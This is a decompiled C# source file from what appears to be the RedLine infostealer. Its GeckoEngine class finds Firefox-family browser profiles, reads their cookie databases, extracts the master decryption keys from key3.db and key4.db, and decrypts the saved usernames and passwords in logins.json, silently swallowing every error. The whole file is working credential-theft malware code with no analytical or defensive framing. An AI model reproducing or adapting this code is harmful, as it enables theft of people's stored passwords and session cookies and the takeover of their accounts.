using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.Json;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;
using RedLine.Models.Gecko;

namespace RedLine.Logic.Browsers.Gecko
{
	// Token: 0x02000069 RID: 105
	public static class GeckoEngine
	{
		// Token: 0x060002C6 RID: 710 RVA: 0x0000C800 File Offset: 0x0000AA00
		public static List<Browser> ParseBrowsers(IList<string> paths)
		{
			List<Browser> list = new List<Browser>();
			try
			{
				foreach (string text in paths)
				{
					try
					{
						string fullName = new FileInfo(text).Directory.FullName;
						string text2 = text.Contains(Constants.RoamingAppData) ? GeckoEngine.GetRoamingName(fullName) : GeckoEngine.GetLocalName(fullName);
						if (!string.IsNullOrEmpty(text2))
						{
							Browser browser = new Browser
							{
								Name = text2,
								Profile = new DirectoryInfo(fullName).Name,
								Cookies = new List<Cookie>(GeckoEngine.ParseCookies(fullName)).IsNull<List<Cookie>>(),
								Credentials = new List<LoginPair>(GeckoEngine.GetCredentials(fullName).IsNull<List<LoginPair>>()).IsNull<List<LoginPair>>(),
								Autofills = new List<Autofill>(),
								CreditCards = new List<CreditCard>()
							};
							if (browser.Cookies.Count((Cookie x) => x.IsNotNull<Cookie>()) <= 0)
							{
								if (browser.Credentials.Count((LoginPair x) => x.IsNotNull<LoginPair>()) <= 0)
								{
									continue;
								}
							}
							list.Add(browser);
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x0000C99C File Offset: 0x0000AB9C
		private static List<LoginPair> GetCredentials(string profile)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					bool flag;
					string text = DecryptHelper.TryCreateTemp(Path.Combine(profile, "key3.db"), out flag);
					list.AddRange(GeckoEngine.ParseLogins(profile, GeckoEngine.GetPrivate4Key(text)));
					if (flag)
					{
						File.Delete(text);
					}
				}
				if (File.Exists(Path.Combine(profile, "key4.db")))
				{
					bool flag2;
					string text2 = DecryptHelper.TryCreateTemp(Path.Combine(profile, "key4.db"), out flag2);
					list.AddRange(GeckoEngine.ParseLogins(profile, GeckoEngine.GetPrivate4Key(text2)));
					if (flag2)
					{
						File.Delete(text2);
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002C8 RID: 712 RVA: 0x0000CA48 File Offset: 0x0000AC48
		private static List<Cookie> ParseCookies(string profile)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				bool flag;
				string text2 = DecryptHelper.TryCreateTemp(text, out flag);
				SqlConnection sqlConnection = new SqlConnection(text2);
				sqlConnection.ReadTable("moz_cookies");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					Cookie cookie = null;
					try
					{
						cookie = new Cookie
						{
							Host = sqlConnection.ParseValue(i, "host").Trim(),
							Http = sqlConnection.ParseValue(i, "host").Trim().StartsWith("."),
							Path = sqlConnection.ParseValue(i, "path").Trim(),
							Secure = (sqlConnection.ParseValue(i, "isSecure") == "1"),
							Expires = Convert.ToInt64(sqlConnection.ParseValue(i, "expiry").Trim()),
							Name = sqlConnection.ParseValue(i, "name").Trim(),
							Value = sqlConnection.ParseValue(i, "value")
						};
					}
					catch
					{
					}
					if (cookie != null)
					{
						list.Add(cookie);
					}
				}
				if (flag)
				{
					File.Delete(text2);
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x0000CBD0 File Offset: 0x0000ADD0
		private static List<LoginPair> ParseLogins(string profile, byte[] privateKey)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				if (!File.Exists(Path.Combine(profile, "logins.json")))
				{
					return list;
				}
				bool flag;
				string path = DecryptHelper.TryCreateTemp(Path.Combine(profile, "logins.json"), out flag);
				foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
				{
					JsonValue jsonValue = (JsonValue)obj;
					Asn1Object asn1Object = Asn1Factory.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
					Asn1Object asn1Object2 = Asn1Factory.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
					string text = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object2.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					LoginPair loginPair = new LoginPair
					{
						Host = (string.IsNullOrEmpty(jsonValue["hostname"].ToString(false)) ? "UNKNOWN" : jsonValue["hostname"].ToString(false)),
						Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
						Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
					};
					if (loginPair.Login != "UNKNOWN" && loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
				if (flag)
				{
					File.Delete(path);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002CA RID: 714 RVA: 0x0000CE4C File Offset: 0x0000B04C
		private static byte[] GetPrivate4Key(string file)
		{
			byte[] result = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return result;
				}
				SqlConnection sqlConnection = new SqlConnection(file);
				sqlConnection.ReadTable("metaData");
				string s = sqlConnection.ParseValue(0, "item1");
				string s2 = sqlConnection.ParseValue(0, "item2)");
				Asn1Object asn1Object = Asn1Factory.Create(Encoding.GetEncoding("windows-1251").GetBytes(s2));
				byte[] objectData = asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = asn1Object.Objects[0].Objects[1].ObjectData;
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.GetEncoding("windows-1251").GetBytes(s), Encoding.GetEncoding("windows-1251").GetBytes(string.Empty), objectData);
				geckoPasswordBasedEncryption.Init();
				TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2, PaddingMode.None);
				sqlConnection.ReadTable("nssPrivate");
				int rowLength = sqlConnection.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (sqlConnection.ParseValue(i, "a102") == Encoding.GetEncoding("windows-1251").GetString(Constants.Key4MagicNumber))
					{
						s3 = sqlConnection.ParseValue(i, "a11");
						break;
					}
				}
				Asn1Object asn1Object2 = Asn1Factory.Create(Encoding.GetEncoding("windows-1251").GetBytes(s3));
				objectData = asn1Object2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				objectData2 = asn1Object2.Objects[0].Objects[1].ObjectData;
				geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.GetEncoding("windows-1251").GetBytes(s), Encoding.GetEncoding("windows-1251").GetBytes(string.Empty), objectData);
				geckoPasswordBasedEncryption.Init();
				result = Encoding.GetEncoding("windows-1251").GetBytes(TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2, PaddingMode.PKCS7));
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060002CB RID: 715 RVA: 0x0000D09C File Offset: 0x0000B29C
		private static byte[] GetPrivate3Key(string file)
		{
			byte[] array = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return array;
				}
				MethodInfo method = typeof(Array).GetMethod("Copy", new Type[]
				{
					typeof(Array),
					typeof(int),
					typeof(Array),
					typeof(int),
					typeof(int)
				});
				GeckoDatabase berkeleyDB = new GeckoDatabase(file);
				PasswordCheck passwordCheck = new PasswordCheck(GeckoEngine.ParseDb(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = GeckoEngine.ParseDb(berkeleyDB, (string x) => x.Equals("global-salt"));
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding("windows-1251").GetBytes(string.Empty), DecryptHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
				geckoPasswordBasedEncryption.Init();
				TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, DecryptHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck), PaddingMode.None);
				Asn1Object asn1Object = Asn1Factory.Create(DecryptHelper.ConvertHexStringToByteArray(GeckoEngine.ParseDb(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption2 = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(hexString), Encoding.GetEncoding("windows-1251").GetBytes(string.Empty), asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				geckoPasswordBasedEncryption2.Init();
				Asn1Object asn1Object2 = Asn1Factory.Create(Asn1Factory.Create(Encoding.GetEncoding("windows-1251").GetBytes(TripleDESHelper.Decrypt(geckoPasswordBasedEncryption2.DataKey, geckoPasswordBasedEncryption2.DataIV, asn1Object.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
				if (asn1Object2.Objects[0].Objects[3].ObjectData.Length > 24)
				{
					method.Invoke(null, new object[]
					{
						asn1Object2.Objects[0].Objects[3].ObjectData,
						asn1Object2.Objects[0].Objects[3].ObjectData.Length - 24,
						array,
						0,
						24
					});
				}
				else
				{
					array = asn1Object2.Objects[0].Objects[3].ObjectData;
				}
			}
			catch
			{
			}
			return array;
		}

		// Token: 0x060002CC RID: 716 RVA: 0x0000D394 File Offset: 0x0000B594
		private static string ParseDb(GeckoDatabase berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.Keys)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x060002CD RID: 717 RVA: 0x0000D420 File Offset: 0x0000B620
		private static string GetRoamingName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[2] == "Profiles")
				{
					text = array[1];
				}
				else
				{
					text = array[0];
				}
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x060002CE RID: 718 RVA: 0x0000D49C File Offset: 0x0000B69C
		private static string GetLocalName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[2] == "Profiles")
				{
					text = array[1];
				}
				else
				{
					text = array[0];
				}
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}
	}
}
